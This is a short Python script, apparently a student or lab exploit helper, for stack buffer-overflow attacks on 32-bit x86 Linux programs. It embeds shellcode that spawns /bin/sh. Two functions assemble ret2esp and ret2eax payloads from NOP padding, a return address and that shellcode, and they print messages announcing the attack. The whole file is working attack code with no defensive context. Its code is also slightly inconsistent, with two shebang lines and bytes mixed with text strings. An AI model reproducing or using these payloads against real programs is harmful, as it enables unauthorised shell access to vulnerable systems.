#!/usr/bin/python
#!/usr/bin/env python3

import os
import sys
from binascii import unhexlify


buffer_list = []
shellcode = "\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x99\x52\x53\x89\xe1\xb0\x0b\xcd\x80"

def payloadGenESP(address,buff_item): #function to generate payload for jump *%esp
	returnAddress=address
	i=buff_item
	i=i+4
	tempPad="90"* i
	pad=unhexlify(tempPad)
	arg= pad+returnAddress+shellcode #payload format for ret2esp
	print("\n\n Generating payload to perform attack using jump *%esp vulnerability.....\n\n")
	return arg


def payloadGenEAX(address,buff_item): #function to generate payload for call *%eax
	returnAddress=address 
	i=(buff_item-len(shellcode))+4
	tempPad="90"* i  
	pad=unhexlify(tempPad)	
	arg= shellcode+pad+returnAddress #payload format for ret2eax
	print("Generating payload to perform attack using call *%eax vulnerability.....\n\n")
	return arg
	
